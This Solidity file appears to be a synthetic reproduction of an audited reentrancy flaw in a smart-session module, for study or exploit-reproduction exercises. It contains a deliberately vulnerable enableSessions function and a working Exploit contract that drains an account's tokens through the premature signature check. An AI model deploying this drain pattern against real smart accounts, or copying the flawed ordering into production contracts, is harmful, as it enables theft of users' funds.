// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Rhinestone / Biconomy Smart Sessions — installation reentrancy (Cantina, Aug 2024)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Source: erc7579/smartsessions@d8897e52fc contracts/core/SmartSessionBase.sol enableSessions
    (pre-PR 102). The session is marked enabled and the validator is installed BEFORE
    erc1271 policies. initializeWithMultiplexer yields control in that window, so
    isValidSignature succeeds and a second module pulls the account's funds.
    PR 102 moves $enabledSessions.add and $sessionValidators.enable to after the policies. */

interface IPolicy {
    function initializeWithMultiplexer(address account, bytes32 configId, bytes calldata initData) external;
}

interface IValidator {
    function onEnable(address account, bytes32 permissionId) external;
}

interface IAccount {
    function installExecutor(address module, address token, uint256 amount, bytes32 hash) external;
}

contract Usd {
    string public name = "Account USD";
    string public symbol = "USD";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract HookPolicy is IPolicy {
    function initializeWithMultiplexer(address account, bytes32, bytes calldata initData) external {
        (address callback, address token, uint256 amount, bytes32 hash) =
            abi.decode(initData, (address, address, uint256, bytes32));
        require(account != address(0), "account");
        IAccount(callback).installExecutor(callback, token, amount, hash);
    }
}

contract YesValidator is IValidator {
    mapping(address => bytes32) public enabledFor;

    function onEnable(address account, bytes32 permissionId) external {
        enabledFor[account] = permissionId;
    }
}

struct Session {
    address sessionValidator;
    address policy;
    bytes policyInit;
}

contract SmartSessions {
    bytes4 public constant MAGIC = 0x1626ba7e;
    bytes4 public constant FAIL = 0xffffffff;

    mapping(address => bool) public sessionEnabled;
    mapping(address => address) public validatorOf;
    mapping(address => bool) public erc1271Installed;
    mapping(address => bool) public actionPolicySet;
    mapping(address => bytes32) public permissionOf;

    function enableSessions(Session[] calldata sessions) external returns (bytes32[] memory permissionIds) {
        uint256 length = sessions.length;
        require(length != 0, "InvalidData");
        permissionIds = new bytes32[](length);
        for (uint256 i; i < length; i++) {
            Session calldata session = sessions[i];
            address smartAccount = msg.sender;
            bytes32 permissionId = keccak256(abi.encode(session.sessionValidator, session.policy, smartAccount));

            // $enabledSessions.add — session is live before any policy is installed.
            sessionEnabled[smartAccount] = true;
            permissionOf[smartAccount] = permissionId;

            // $sessionValidators.enable — validator accepts signatures before erc1271 policies exist.
            validatorOf[smartAccount] = session.sessionValidator;
            IValidator(session.sessionValidator).onEnable(smartAccount, permissionId);

            // $userOpPolicies.enable → initializeWithMultiplexer (external).
            // @> VULN: sessionEnabled and the validator are already set, erc1271Installed is still false, so isValidSignature returns MAGIC and the callee installs a second module that pulls the account's USD.
            IPolicy(session.policy).initializeWithMultiplexer(smartAccount, permissionId, session.policyInit);

            // $erc1271Policies.enable — too late. The drain already returned.
            erc1271Installed[smartAccount] = true;

            // $actionPolicies.enable
            actionPolicySet[smartAccount] = true;
            permissionIds[i] = permissionId;
        }
    }

    function isValidSignature(bytes32, bytes calldata) external view returns (bytes4) {
        address account = msg.sender;
        if (!sessionEnabled[account]) return FAIL;
        if (validatorOf[account] == address(0)) return FAIL;
        // Policies that are not installed yet are skipped. An installed erc1271 policy rejects the drain hash.
        if (erc1271Installed[account]) return FAIL;
        return MAGIC;
    }
}

interface ISmartSessions {
    function enableSessions(Session[] calldata sessions) external returns (bytes32[] memory);
    function isValidSignature(bytes32 hash, bytes calldata sig) external view returns (bytes4);
    function MAGIC() external view returns (bytes4);
    function erc1271Installed(address account) external view returns (bool);
}

contract SmartAccount {
    ISmartSessions public sessions;
    Usd public usd;
    YesValidator public validator;
    address public executor;
    uint256 public moduleCount;

    constructor(ISmartSessions _sessions, Usd _usd, YesValidator _validator) {
        sessions = _sessions;
        usd = _usd;
        validator = _validator;
        moduleCount = 1;
    }

    function enableLimitedSession(address policy, bytes calldata policyInit) external {
        Session[] memory sessions_ = new Session[](1);
        sessions_[0] = Session({sessionValidator: address(validator), policy: policy, policyInit: policyInit});
        sessions.enableSessions(sessions_);
    }

    function installExecutor(address module, address token, uint256 amount, bytes32 hash) external {
        require(sessions.isValidSignature(hash, "") == sessions.MAGIC(), "erc1271");
        executor = module;
        moduleCount = 2;
        require(token == address(usd), "token");
        require(amount == 1000 ether, "amount");
        usd.transfer(module, amount);
    }
}

contract Exploit {
    Usd public usd; // nonce 1
    HookPolicy public policy; // nonce 2
    YesValidator public validator; // nonce 3
    SmartSessions public sessions; // nonce 4
    SmartAccount public account; // nonce 5

    bytes32 public constant DRAIN_HASH = keccak256("smart-sessions-drain");

    constructor() {
        usd = new Usd();
        policy = new HookPolicy();
        validator = new YesValidator();
        sessions = new SmartSessions();
        account = new SmartAccount(ISmartSessions(address(sessions)), usd, validator);
    }

    function run() external {
        usd.mint(address(account), 1000 ether);
        bytes memory initData = abi.encode(address(this), address(usd), uint256(1000 ether), DRAIN_HASH);
        account.enableLimitedSession(address(policy), initData);
        require(usd.balanceOf(address(this)) == 1000 ether, "stolen");
        require(usd.balanceOf(address(account)) == 0, "account drained");
        require(account.moduleCount() == 2, "second module");
        require(account.executor() == address(this), "executor");
        require(sessions.erc1271Installed(address(account)), "policies after drain");
        (bool ok,) = address(account).call(
            abi.encodeWithSelector(account.installExecutor.selector, address(this), address(usd), uint256(1000 ether), DRAIN_HASH)
        );
        require(!ok, "later install must fail");
    }

    // HookPolicy calls installExecutor on this module. The account's check is the premature signature.
    // This function exists so the module address and the callback target are the same contract:
    // installExecutor's `module` argument is address(this), and the policy calls that address.
    function installExecutor(address module, address token, uint256 amount, bytes32 hash) external {
        account.installExecutor(module, token, amount, hash);
    }
}
